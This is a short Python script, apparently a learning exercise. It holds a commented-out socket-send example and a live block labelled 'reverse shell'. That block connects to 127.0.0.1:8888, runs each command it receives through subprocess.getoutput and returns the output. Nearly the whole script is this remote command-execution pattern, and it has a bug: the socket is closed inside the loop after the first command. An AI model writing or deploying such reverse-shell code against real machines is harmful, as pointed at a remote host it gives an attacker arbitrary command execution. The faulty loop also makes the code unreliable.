import socket
import subprocess

"""
    Ex.1 receive bytes from client
"""
# cli = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# cli.connect(('127.0.0.1', 8888))
# cli.send(b'<My first message>')
# cli.close()

"""
    Ex.2 reverse shell
"""
cli = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
cli.connect(('127.0.0.1', 8888))

while True:
    command = cli.recv(1024).decode()
    if command.lower() == 'exit':
        break
    output = subprocess.getoutput(command)
    cli.send(output.encode())
    cli.close()
